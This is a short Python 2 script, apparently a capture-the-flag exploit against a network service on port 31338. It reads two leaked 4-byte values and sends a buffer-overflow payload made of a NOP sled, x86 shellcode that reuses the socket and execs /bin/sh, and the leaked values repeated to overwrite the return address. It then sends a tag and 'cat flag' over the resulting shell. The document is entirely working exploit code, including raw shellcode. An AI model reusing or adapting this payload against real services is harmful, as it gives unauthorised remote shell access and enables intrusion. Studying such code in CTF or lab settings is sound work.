import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("0.0.0.0", 31338))
#s.connect(("128.238.66.212", 31338))

i = s.recv(4)
j = s.recv(4)
print i
print j
print s.recv(98)

payload = (("\x90"*100) + 
	("\x89\xe1\x66\x31\xc9\x31\xdb\xb3\x14\x31\xd2\xb2\x04\x4b\x75\x02\xcd\x03\x31\xc0\xb0\x03\xcd\x80\x3c\x04\x75\xf1\x81\x39\x0d\xf0\xfe\xca\x75\xe9\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80") + 
	(j*473) + 
	(i*10))

#s.send("A"*4000)
print(payload)
s.send(payload)
#print s.recv(0)
s.send("\x0d\xf0\xfe\xca")
s.send("cat flag\n")
print s.recv(100)

#print(s.recv(100))
